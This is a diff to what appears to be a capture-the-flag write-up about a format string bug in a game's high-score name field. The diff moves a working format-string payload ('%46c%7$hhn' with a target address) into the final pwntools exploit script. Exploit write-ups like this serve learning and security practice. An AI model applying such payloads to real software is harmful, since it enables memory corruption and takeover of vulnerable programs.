@@ -145,7 +145,6 @@ There is a string format vulnerability in the name field of the high score after
 # 0x804a2b8 = '1'
 # '2' == 50
 # Padding necessary -> 50 - 4 bytes of address = 46
-shellcode = p32(0x804a2b8) + '%46c%7$hhn'
 ```
 
 ## Final Exploit
@@ -400,7 +399,8 @@ while True:
     # Name - Flag 1
     r.sendline('pwned')
     # Name - Flag 2
-    #r.sendline('\xb8\xa2\x04\x08%46c%7$hhn')
+    shellcode = p32(0x804a2b8) + '%46c%7$hhn'
+    r.sendline(shellcode)
     r.interactive()
     r.close()
 ```
